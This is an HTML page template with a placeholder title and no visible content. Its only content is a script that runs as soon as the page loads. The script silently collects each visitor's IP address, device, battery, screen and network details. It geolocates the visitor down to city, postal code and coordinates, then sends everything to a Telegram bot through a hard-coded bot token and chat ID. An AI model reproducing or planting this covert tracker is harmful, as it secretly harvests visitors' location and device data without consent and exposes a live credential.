<!DOCTYPE html>
<html>
<head>
    <title>Your Title Here</title>
</head>
<body>
<script>
function myFunction() {
    // Get the current URL
    const currentURL = window.location.href;

    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(ipData => {
            const ipAddress = ipData.ip;
            const userAgent = navigator.userAgent;
            const deviceMemory = navigator.deviceMemory;

            // Get network information
            const connectionType = navigator.connection.type;
            const effectiveConnectionType = navigator.connection.effectiveType;

            // Get battery information
            navigator.getBattery().then(batteryData => {
                const batteryLevel = batteryData.level * 100; // Battery level in percentage
                const charging = batteryData.charging ? 'Plugged In' : 'Not Plugged In';

                // Get screen information
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;
                const screenOrientation = window.screen.orientation.type;

                // Get window information
                const windowWidth = window.innerWidth;
                const windowHeight = window.innerHeight;

                const geoUrl = `https://ipapi.co/${ipAddress}/json/`;

                fetch(geoUrl)
                    .then(geoResponse => geoResponse.json())
                    .then(geoData => {
                        const country = geoData.country_name;
                        const region = geoData.region;
                        const city = geoData.city;
                        const zip = geoData.postal;
                        const latitude = geoData.latitude;
                        const longitude = geoData.longitude;
                        const timezone = geoData.timezone;
                        const isp = geoData.org;

                        const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nConnection Type: ${connectionType}\nEffective Connection Type: ${effectiveConnectionType}\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nScreen Orientation: ${screenOrientation}\nWindow Width: ${windowWidth}px\nWindow Height: ${windowHeight}px`);

                        const apiUrl = `https://api.telegram.org/bot6696450444:AAEjPvTws_uuAuN2g_resbLkQth5AWu7l_E/sendMessage?chat_id=5114789651&text=${text}`;
                        fetch(apiUrl)
                            .then(response => response.json())
                            .then(data => {
                                console.log(data);
                            })
                            .catch(error => {
                                console.error(error);
                            });
                    })
                    .catch(error => {
                        console.error(error);
                    });
            });
        })
        .catch(error => {
            console.error(error);
        });
}
window.addEventListener('load', myFunction);
</script>
</body>
</html>
